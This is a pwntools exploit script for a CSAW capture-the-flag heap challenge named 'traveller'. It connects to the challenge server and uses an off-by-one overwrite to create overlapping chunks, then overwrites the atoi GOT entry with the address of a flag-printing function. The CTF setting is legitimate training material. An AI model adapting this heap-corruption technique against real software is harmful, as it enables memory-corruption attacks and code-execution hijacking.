#!/usr/bin/env python

from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./traveller', checksec=False)
#p = process('./traveller', env={'LD_PRELOAD': './libc-2.23.so'})
p = remote('pwn.chal.csaw.io', 1003)

def add(distance, destination):
    p.recvuntil('> ')
    p.sendline('1')

    p.recvuntil('> ')
    p.sendline(str(distance))

    p.recvuntil('Destination: ')
    p.sendline(destination)

def change(index, data):
    p.recvuntil('> ')
    p.sendline('2')

    p.recvuntil('Update trip: ')
    p.sendline(str(index))

    #p.recv()
    p.send(data)

def delete(index):
    p.recvuntil('> ')
    p.sendline('3')

    p.recvuntil('Which trip you want to delete: ')
    p.sendline(str(index))

def check(index):
    p.recvuntil('> ')
    p.sendline('4')

    p.recvuntil('Which trip you want to view? \n')
    p.recvuntil('>')

    p.sendline(str(index))

p.recvuntil('Hello! Welcome to trip management system. \n')
stack_leak = int(p.recvline(), 16)

log.info('Stack addr: 0x%08x' % stack_leak)

breakpoints  = ''
breakpoints += 'b* 0x400B72\n'
breakpoints += 'b* 0x400A28\n'
breakpoints += 'b* 0x400C9A\n'
breakpoints += 'b* 0x4009B9\n'
breakpoints += 'c'
#db.attach(p, breakpoints)

sizes = {0x80: 1,
         0x110: 2,
         0x128: 3,
         0x150: 4,
         0x200: 5}

# S 0x80 | S 0x80 | S 0x80 |
size = 0x80
for c in ['X', 'Y', 'Z']:
    add(sizes[size], c * size)


#        |        |        |
delete(0)
delete(0)
delete(0)

# S      | S      | S      |
# A |  B  | C
add(sizes[0x128], 'A' * 0x120 + p64(0x130)) # 0
add(sizes[0x200], 'B' * 0x1f0 + p64(0x200) * 2) # 1
add(sizes[0x128], 'C' * 0x128) # 2

log.info('freeing B')
# A |     | C
delete(1) # 'C' moves to 1

log.info('trigerring bug')
change(0, 'A' * 0x120 + p64(0x130)) # off by one overwrite PREV_INUSE of B

log.info('adding b1')
# A | 1   | C
add(sizes[0x110], '1' * (0x110 - 1)) # 2
log.info('adding b2')
# A | 1 S | C
add(sizes[0x110], '2' * (0x110 - 1)) # 3


# A |   S | C
log.info('deleting b1')
delete(2)

log.info('deleting C')
# A |   S
delete(1)


# overlap chunks to control pointer
add(sizes[0x200], 'A' * 0x120 + p64(elf.got['atoi']))
# write cat_flag adress into atoi got
change(1, p64(elf.symbols['cat_flag']))
#check(0)

# should check 3
p.recvuntil('> ')
p.sendline('1')
p.recv()
